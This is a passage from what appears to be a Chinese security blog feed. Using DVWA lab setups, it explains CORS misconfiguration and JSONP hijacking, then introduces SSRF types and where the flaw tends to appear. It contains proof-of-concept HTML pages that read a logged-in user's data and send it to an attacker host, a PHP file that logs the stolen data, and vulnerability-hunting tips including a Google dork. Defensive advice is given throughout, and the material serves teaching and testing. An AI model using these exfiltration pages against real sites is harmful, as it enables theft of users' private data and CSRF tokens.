class="keyword">array</span>( <span class="string">&#x27;authenticated&#x27;</span>, <span class="string">&#x27;phpids&#x27;</span> ) );</span><br><span class="line">	dvwaDatabaseConnect();</span><br><span class="line"></span><br><span class="line">	<span class="variable">$query</span>  = <span class="string">&quot;SELECT user_id, first_name, last_name, user, last_login FROM users WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> );</span><br><span class="line">	<span class="variable">$row</span> = mysqli_fetch_row( <span class="variable">$result</span> );</span><br><span class="line"></span><br><span class="line">	printf (<span class="string">&#x27;&#123;&quot;user_id&quot;:&quot;%d&quot;,&quot;first_name&quot;:&quot;%s&quot;,&quot;last_name&quot;:&quot;%s&quot;,&quot;user&quot;:&quot;%s&quot;,&quot;last_login&quot;:&quot;%s&quot;&#125;&#x27;</span>,<span class="variable">$row</span>[<span class="number">0</span>],<span class="variable">$row</span>[<span class="number">1</span>],<span class="variable">$row</span>[<span class="number">2</span>],<span class="variable">$row</span>[<span class="number">3</span>],<span class="variable">$row</span>[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>成功通过Ajax请求到用户接口</p>
<p><img src="https://i.loli.net/2021/11/20/KgjQFcWNC9MPqnm.png" alt="image-20211120180453780"></p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>PHP设置了头部字段<code>Access-Control-Allow-Origin: $_SERVER[&#39;HTTP_ORIGIN&#39;]</code>给客户端，所以，受害者浏览器允许包含恶意JavaScript代码的页面访问用户的隐私数据。</p>
<p>PHP设置<code>Access-Control-Allow-Credentials</code>字段为<code>true</code>说明服务器同意发送Cookie。但是必须在AJAX请求中打开<code>withCredentials</code>属性，浏览器才能允许发送。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，如果要发送Cookie，<code>Access-Control-Allow-Origin</code>就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的<code>document.cookie</code>也无法读取服务器域名下的Cookie。</p>
<h3 id="抓包演示"><a href="#抓包演示" class="headerlink" title="抓包演示"></a>抓包演示</h3><p><img src="https://i.loli.net/2021/11/20/mSinF8RZPjlHKTr.png" alt="image-20211120181024266"></p>
<p>抓包发现请求<code>http://hackrock.com:812/vulnerabilities/cors/</code>发现了对应的响应头。<code>Access-Control-Allow-Origin</code>指是允许访问的源，<code>Access-Control-Allow-Credentials</code>指的是允许带上cookie访问资源。这样浏览器就不会出错而拦截请求了。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>CORS漏洞虽然和CSRF漏洞是两种不同的概念，但是二者的利用方法却如出一辙。</p>
<p>构造我们要发送给受害者的恶意页面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>CORS Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">get_info</span>(<span class="params">the_request_url</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> xmlHttp;</span></span><br><span class="line"><span class="javascript">			xmlHttp = <span class="keyword">new</span> XMLHttpRequest();	</span></span><br><span class="line"><span class="javascript">		</span></span><br><span class="line"><span class="javascript">			<span class="keyword">if</span> (xmlHttp) &#123;</span></span><br><span class="line"><span class="javascript">				xmlHttp.open(<span class="string">&#x27;GET&#x27;</span>, the_request_url, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">				xmlHttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">					<span class="keyword">if</span> (xmlHttp.readyState == <span class="number">4</span> &amp;&amp; xmlHttp.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">						<span class="keyword">new</span> Image().src = <span class="string">&quot;http://hackmee.com/attack/get_info.php?info=&quot;</span> + xmlHttp.responseText;</span></span><br><span class="line"><span class="javascript">					&#125;</span></span><br><span class="line"><span class="javascript">				&#125;;</span></span><br><span class="line"><span class="javascript">				xmlHttp.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">				xmlHttp.send(<span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript">			&#125;</span></span><br><span class="line"><span class="javascript">		&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">		get_info(<span class="string">&#x27;http://hackrock.com:812/vulnerabilities/cors/&#x27;</span>);</span></span><br><span class="line"><span class="javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>创建接收用户数据的文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>];</span><br><span class="line">	<span class="variable">$log</span> = fopen(<span class="string">&quot;info.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$log</span>, <span class="variable">$info</span> .<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当用户点开恶意链接的时候，就可以自动获取用户的敏感数据了。</p>
<h2 id="CORS漏洞挖掘技巧"><a href="#CORS漏洞挖掘技巧" class="headerlink" title="CORS漏洞挖掘技巧"></a>CORS漏洞挖掘技巧</h2><p>我们可以总结挖掘CORS漏洞的以下特点：</p>
<blockquote>
<p>请求头携带CORS特征：</p>
<ul>
<li>Origin: xxxxx</li>
</ul>
<p>响应头携带CORS特征：</p>
<ul>
<li>Access-Control-Allow-Origin: xxxxx</li>
<li>Access-Control-Allow-Method: POST,GET,OPTIONS</li>
<li>Access-Control-Allow-Credentials: true</li>
</ul>
</blockquote>
<p>所以在我们挖掘CORS漏洞中将BurpSuite的请求头中加上Origin的头部字段</p>
<p><img src="https://i.loli.net/2021/11/20/aMeiOYUEyX1pc89.png" alt="在这里插入图片描述"></p>
<p>访问足够多的认为有漏洞的网站后，再将Proxy模块下的HTTP history来筛选带有CORS头部的值</p>
<p><img src="https://i.loli.net/2021/11/20/zcujs8FNokUdAiJ.png" alt="在这里插入图片描述"></p>
<p>筛选条件可以设置成：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span><span class="punctuation">: </span>true</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/20/Wxn8t4hQwNrU6bf.png" alt="在这里插入图片描述"></p>
<h2 id="CORS漏洞的防御"><a href="#CORS漏洞的防御" class="headerlink" title="CORS漏洞的防御"></a>CORS漏洞的防御</h2><h3 id="如果不必要就不要开启CORS"><a href="#如果不必要就不要开启CORS" class="headerlink" title="如果不必要就不要开启CORS"></a>如果不必要就不要开启CORS</h3><p>仔细评估是否开启CORS，如果不必要就不要开启CORS</p>
<h3 id="定义白名单"><a href="#定义白名单" class="headerlink" title="定义白名单"></a>定义白名单</h3><p>如果是绝对必要的话，要定义“源”的白名单。尽量不使用正则表达式配置，不要配置“Access-Contol-Allow-Origin”为通配符“*”，同时严格校验来自请求的Origin值。</p>
<h3 id="仅仅允许安全的协议"><a href="#仅仅允许安全的协议" class="headerlink" title="仅仅允许安全的协议"></a>仅仅允许安全的协议</h3><p>仅仅允许安全的协议，有必要验证协议以确保不允许来自不安全通道（HTTP）的交互，否则中间人(MitM)将绕过应用是所使用的HTTPS</p>
<h3 id="配置“VARY”头部"><a href="#配置“VARY”头部" class="headerlink" title="配置“VARY”头部"></a>配置“VARY”头部</h3><p>要尽可能的返回”Vary: Origin”这个头部，以避免攻击者利用浏览器缓存</p>
<h3 id="如果可能的话避免使用“CREDENTIALS”"><a href="#如果可能的话避免使用“CREDENTIALS”" class="headerlink" title="如果可能的话避免使用“CREDENTIALS”"></a>如果可能的话避免使用“CREDENTIALS”</h3><p>由于“Access-Control-Allow-Credentials”标头设置为“true”时允许跨域请求中带有凭证数据，因此只有在严格必要时才应配置它。此头部也增加了CSRF攻击的风险;因此，有必要对其进行保护。</p>
<h3 id="限制使用的方法"><a href="#限制使用的方法" class="headerlink" title="限制使用的方法"></a>限制使用的方法</h3><p>通过“Access-Control-Allow-Methods”头部，还可以配置允许跨域请求的方法，这样可以最大限度地减少所涉及的方法。</p>
<h3 id="限制缓存的时间"><a href="#限制缓存的时间" class="headerlink" title="限制缓存的时间"></a>限制缓存的时间</h3><p>通过“Access-Control-Allow-Methods”和“Access-Control-Allow-Headers”头部，限制浏览器缓存信息的时间。可以通过使用“Access-Control-Max-Age”标题来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值（例如大约30分钟），确保浏览器在短时间内可以更新策略（比如允许的源）。</p>
<h3 id="仅配置所需要的头"><a href="#仅配置所需要的头" class="headerlink" title="仅配置所需要的头"></a>仅配置所需要的头</h3><p>仅在接收到跨域请求的时候才配置有关于跨域的头部，并且确保跨域请求是合法的（只允许来自合法的源）。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>邱永华 著《XSS跨站脚本攻击剖析与防御》</li>
<li><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">跨域资源共享 CORS 详解 - 阮一峰的网络日志 (ruanyifeng.com)</a></li>
<li><a href="https://www.godrry.com/archives/Same-origin-policy-and-CORS.html">详解浏览器同源策略和跨资源共享CORS - GodGc’s World (godrry.com)</a></li>
<li><a href="https://blog.csdn.net/m0_38103658/article/details/102721402">CORS漏洞原理分析_m0_38103658的博客-CSDN博客_cors漏洞</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>CSRF跨站请求伪造</category>
      </categories>
      <tags>
        <tag>CORS跨域</tag>
      </tags>
  </entry>
  <entry>
    <title>JSONP劫持漏洞</title>
    <url>/post/b7b7b91b.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="JSONP的介绍"><a href="#JSONP的介绍" class="headerlink" title="JSONP的介绍"></a>JSONP的介绍</h2><p>JSONP(JSON with Padding)是JSON的一种“使用模式”，可用于解决主流浏览器的跨域数据访问的问题。由于同源策略，一般来说位于 server1.example.com 的网页无法与不是 server1.example.com的服务器沟通，而 HTML 的<code>&lt;script&gt;</code> 元素是一个例外。利用 <code>&lt;script&gt;</code> 元素的这个开放策略，网页可以得到从其他来源动态产生的 JSON 资料，而这种使用模式就是所谓的 JSONP。用 JSONP 抓到的资料并不是 JSON，而是任意的JavaScript，用 JavaScript 直译器执行而不是用 JSON 解析器解析。</p>
<blockquote>
<p>有关JSONP的产生与实现推荐参考下面这篇文章，讲的非常清楚易懂：</p>
<p><a href="https://www.jianshu.com/p/e1e2920dac95">https://www.jianshu.com/p/e1e2920dac95</a></p>
</blockquote>
<p><strong>JSONP劫持</strong></p>
<p>JSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站听过 JSONP 的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。</p>
<p>JSONP劫持的攻击过程有点类似于CSRF，只不过CSRF只管发送http请求，但是json-hijack的目的是获取敏感数据。</p>
<p><img src="https://i.loli.net/2021/11/20/rtxuV4KiZE5szB8.png" alt="img"></p>
<h2 id="靶场演示"><a href="#靶场演示" class="headerlink" title="靶场演示"></a>靶场演示</h2><h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>我们基于DVWA靶场简单写了一个获取当前用户信息的接口。</p>
<p>源代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	define( <span class="string">&#x27;DVWA_WEB_PAGE_TO_ROOT&#x27;</span>, <span class="string">&#x27;../../&#x27;</span> );</span><br><span class="line">	<span class="keyword">require_once</span> DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;dvwa/includes/dvwaPage.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	dvwaPageStartup( <span class="keyword">array</span>( <span class="string">&#x27;authenticated&#x27;</span>, <span class="string">&#x27;phpids&#x27;</span> ) );</span><br><span class="line">	dvwaDatabaseConnect();</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$reqMethod</span> = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">	<span class="variable">$reqValue</span> = <span class="string">&quot;callback&quot;</span>;</span><br><span class="line">	<span class="variable">$query</span>  = <span class="string">&quot;SELECT user_id, first_name, last_name, user, last_login FROM users WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> );</span><br><span class="line">	<span class="variable">$row</span> = mysqli_fetch_row( <span class="variable">$result</span> );</span><br><span class="line">	<span class="variable">$info</span> = <span class="keyword">array</span>(<span class="string">&#x27;user_id&#x27;</span> =&gt; <span class="variable">$row</span>[<span class="number">0</span>], <span class="string">&#x27;first_name&#x27;</span> =&gt; <span class="variable">$row</span>[<span class="number">1</span>], <span class="string">&#x27;last_name&#x27;</span> =&gt; <span class="variable">$row</span>[<span class="number">2</span>], <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$row</span>[<span class="number">3</span>], <span class="string">&#x27;last_login&#x27;</span> =&gt; <span class="variable">$row</span>[<span class="number">4</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!@<span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>])&#123;</span><br><span class="line">		<span class="keyword">echo</span> json_encode(<span class="variable">$info</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$callback&#125;</span>(&quot;</span> . json_encode(<span class="variable">$info</span>) . <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>编写PoC文件，通过回调函数去请求用户信息：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">data</span>)</span>&#123; alert(<span class="built_in">JSON</span>.stringify(data)) &#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://hackrock.com:812/vulnerabilities/jsonp/?callback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问PoC文件，页面会执行脚本，请求<code>http://hackrock.com:812/vulnerabilities/jsonp/?callback=test</code>，拿到的请求内容</p>
<p>然后将请求的内容作为参数，执行test函数，test函数将请求的内容alert出来。最终的结果如下</p>
<p><img src="https://i.loli.net/2021/11/21/dhRvPfweqijc1VF.png" alt="image-20211121002148283"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>修改一下PoC文件：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    info = <span class="built_in">JSON</span>.stringify(data)</span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Image().src = <span class="string">&quot;http://hackmee.com/attack/get_info.php?info=&quot;</span> + info;</span></span><br><span class="line"><span class="javascript">&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://hackrock.com:812/vulnerabilities/jsonp/?callback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>创建接收用户数据的文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>];</span><br><span class="line">	<span class="variable">$log</span> = fopen(<span class="string">&quot;info.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$log</span>, <span class="variable">$info</span> .<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当用户点开恶意链接的时候，就可以自动获取用户的敏感数据了。</p>
<blockquote>
<p>Tips：既然是窃取敏感信息，那么敏感信息除了一些 email 手机号 用户名等还有什么呢？没错，甚至可以是 CSRF Token 信息，有时候在 CSRF token 获取不到但是又找不到 XSS 的攻击点的时候不妨考虑一下 jsonp 劫持。</p>
</blockquote>
<h3 id="JSONP中的反射型XSS"><a href="#JSONP中的反射型XSS" class="headerlink" title="JSONP中的反射型XSS"></a>JSONP中的反射型XSS</h3><p>由于callback参数可以自定义，所以就有了所有注入漏洞都有的通病：“输入在输出中回显”，其中导致的一个问题就是XSS，前提是返回包<code>Content-Type:text/html</code>而不是<code>Content-Type: application/json</code>。</p>
<p><img src="https://i.loli.net/2021/11/21/2HnQjpsKu9BtrXM.png" alt="image-20211121131217798"></p>
<p>从响应头中可以看到<code>Content-Type</code>字段的值为<code>text/html</code>，再加上源代码中并没有对callback这个输出点进行实体化编码或过滤，这就导致了反射型XSS。</p>
<p><img src="https://i.loli.net/2021/11/21/dshxeRvCHjUaTMl.png" alt="image-20211121131639225"></p>
<p>防御方法：</p>
<ul>
<li>严格定义Content-Type: application/json</li>
<li>对callback的值进行实体化编码或过滤</li>
</ul>
<h2 id="JSONP漏洞挖掘技巧"><a href="#JSONP漏洞挖掘技巧" class="headerlink" title="JSONP漏洞挖掘技巧"></a>JSONP漏洞挖掘技巧</h2><h3 id="Google语法搜索jsonp接口"><a href="#Google语法搜索jsonp接口" class="headerlink" title="Google语法搜索jsonp接口"></a>Google语法搜索jsonp接口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com inurl:?callback</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/21/I7DTZX8r25uJNYx.jpg" alt="image"></p>
<h3 id="在浏览器调试中寻找关键字"><a href="#在浏览器调试中寻找关键字" class="headerlink" title="在浏览器调试中寻找关键字"></a>在浏览器调试中寻找关键字</h3><p><strong>收集接口：</strong>找到<strong>返回数据格式是JSONP的接口</strong>（可以在数据包中检索关键词callback/json/jsonp/email/cb 等）</p>
<p><img src="https://i.loli.net/2021/11/21/tHPA4c3n6NrTwXb.png" alt="image-20211121133335679"></p>
<p>加参数看返回信息：加上callback参数，观察返回值是否变化，是否返回jsonp格式的信息</p>
<p><img src="https://i.loli.net/2021/11/21/sCLjZpQeaYXgJ4R.png" alt="img"></p>
<h2 id="JSONP漏洞的防御"><a href="#JSONP漏洞的防御" class="headerlink" title="JSONP漏洞的防御"></a>JSONP漏洞的防御</h2><p>JSONP劫持属于CSRF的攻击范畴，所以解决的方法和解决CSRF的方法一样。</p>
<ul>
<li>限制来源Referer</li>
<li>部署一次性 Token</li>
<li>严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ），预防XSS</li>
<li>过滤callback函数名与长度以及JSON数据输出，预防XSS</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://www.jianshu.com/p/e1e2920dac95">JSONP跨域详解 - 简书 (jianshu.com)</a></li>
<li><a href="https://www.freebuf.com/articles/web/207802.html">JSONP劫持CORS跨源资源共享漏洞 - FreeBuf网络安全行业门户</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1516219">JSON相关漏洞（Hijacking+Injection）挖掘技巧及实战案例全汇总 - 云+社区 - 腾讯云 (tencent.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/65634755">JSON劫持攻击[汇总] - 知乎 (zhihu.com)</a></li>
<li><a href="https://www.cnblogs.com/yyhuni/p/15563994.html">JSONP劫持 - 洋洋的小黑屋 - 博客园 (cnblogs.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>CSRF跨站请求伪造</category>
      </categories>
      <tags>
        <tag>JSONP劫持</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF漏洞原理</title>
    <url>/post/7cd8d249.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="什么是SSRF漏洞？"><a href="#什么是SSRF漏洞？" class="headerlink" title="什么是SSRF漏洞？"></a>什么是SSRF漏洞？</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><img src="https://i.loli.net/2021/11/23/WfoYAzHFhklPL8Z.png" alt="Untitled Diagram.drawio (1)"></p>
<p>由于业务需要，服务端程序需要从其他服务器应用中获取数据，例如获取图片、数据等，但是由于服务器没有对其请求的目标地址做过滤和限制，导致黑客可以利用此缺陷请求任意服务器资源，其中就包含隐匿在内网的应用。很多企业认为服务器在内网不会受到黑客攻击，便放任漏洞不管，不做补丁修复和版本升级，弱口令遍布内网。但是在SSRF漏洞面前这些漏洞都会成为黑客的“盘中餐”。</p>
<p>SSRF漏洞一般为HTTP／HTTPS方式出现，但类似TCP Connect方式也可以探测内网的IP活跃状态和端口的开放情况，但此类危害较小。</p>
<h3 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h3><p>根据是否显示攻击者的响应，SSRF可分为以下两种类型：</p>
<h4 id="Basic型"><a href="#Basic型" class="headerlink" title="Basic型"></a>Basic型</h4><p>回显SSRF。显示对攻击者的响应。在服务器获取攻击者要求的URL后，把响应发送回攻击者。返回结果到客户端，如传送一个网址，会返回这个网址的界面或对应的 html 代码。</p>
<h4 id="Blind型"><a href="#Blind型" class="headerlink" title="Blind型"></a>Blind型</h4><p>盲SSRF。不显示响应。在服务器获取攻击者要求的URL后，不会把响应内容发送给攻击者。通常，攻击者将提供url，但是该url中的数据将永远不会返回给攻击者。要在这种情况下确认漏洞，攻击者必须使用Burp，DNSLog等类似工具。这些工具可以通过强制服务器向攻击者控制的服务器发出DNS或HTTP请求来确认服务器是易受攻击的。这种SSRF通常易于验证，但难以利用。</p>
<h4 id="Semi-Blind型"><a href="#Semi-Blind型" class="headerlink" title="Semi-Blind型"></a>Semi-Blind型</h4><p>侧信息SSRF。与Blind型相似，这种SSRF不会返回相关结果请求的所有详细信息，但是会暴露一些数据。这可能是部分数据或错误信息，他们为攻击者提供了更多信息。有时，关于请求的元数据（例如响应时间）也可以视为Semi-Blind型，因为它们允许攻击者验证请求是否成功。这种SSRF通常足以验证漏洞，但并不总是能够提取敏感数据。</p>
<h4 id="Bool型"><a href="#Bool型" class="headerlink" title="Bool型"></a>Bool型</h4><p>严格意义上讲属于Semi-Blind型的一种。简单来说就是仅返回<code>True</code> 或<code>False</code>的SSRF。只有服务器端正确响应HTTP请求并且只有响应码为200的时候，返回Success，其余全部返回Failed。</p>
<h2 id="SSRF漏洞可能出现的位置"><a href="#SSRF漏洞可能出现的位置" class="headerlink" title="SSRF漏洞可能出现的位置"></a>SSRF漏洞可能出现的位置</h2><p>能够对外发送网络请求的地方，就可能存在SSRF漏洞。</p>
<ul>
<li><p>社交分享功能：获取超链接的标题等内容进行显示</p>
</li>
<li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
</li>
<li><p>在线翻译：给网址翻译对应网页的内容</p>
</li>
<li><p>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
</li>
<li><p>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
</li>
<li><p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
</li>
<li><p>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
</li>
<li><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>
</li>
<li><p>邮件系统：比如接收邮件服务器地址</p>
</li>
<li><p>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
</li>
<li><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞</p>
<p>一些的url中的关键字：<code>share</code>、<code>wap</code>、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>
</li>
<li><p>从远程服务器请求资源（<code>upload from url</code> 如discuz！；<code>import &amp; expost rss feed</code> 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
</li>
</ul>
<h2 id="SSRF漏洞的危害"><a href="#SSRF漏洞的危害" class="headerlink" title="SSRF漏洞的危害"></a>SSRF漏洞的危害</h2><ul>
<li>对目标服务器所在的内网进行IP存活性扫描和端口扫描</li>
<li>利用扫描的指纹信息判断开放的服务，从而对内网的主机进行攻击</li>
<li>识别内网WEB应用指纹，判断应用类型进行攻击</li>
<li>使用特定协议攻击应用（gopher、dict、file、FTP／SFTP等）</li>
<li>拒绝服务攻击（请求大文件，始终保持连接）</li>
</ul>
<h2 id="SSRF漏洞的验证"><a href="#SSRF漏洞的验证" class="headerlink" title="SSRF漏洞的验证"></a>SSRF漏洞的验证</h2><ul>
<li><p><strong>排除法：</strong><br>浏览器f12查看源代码看是否是在本地进行了请求<br>比如：资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）">http://www.xxx.com/a.php?image=（地址）</a> 的就可能存在SSRF漏洞</p>
</li>
<li><p><strong>DNSLog等工具进行测试，看是否被访问：</strong><br>可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</p>
</li>
<li><p><strong>抓包分析发送的请求是不是由服务器的发送的：</strong></p>
<p>如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址。</p>
<p>——从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址。</p>
<p>——通过二级域名暴力猜解工具模糊猜测内网地址。</p>
</li>
<li><p><strong>直接返回的Banner、title、content等信息</strong></p>
</li>
<li><p><strong>留意bool型SSRF：</strong></p>
<p>一般的SSRF在应用识别阶段返回的信息相对较多，比如Banner信息，HTTP Title信息，更有甚的会将整个HTTP的Reponse完全返回。而Bool型SSRF的却永远只有True或者False。</p>
<p>因为没有任何Response信息,所以对于攻击Payload的选择也是有很多限制的, 不能选择需要和Response信息交互的Payload。</p>
</li>
</ul>
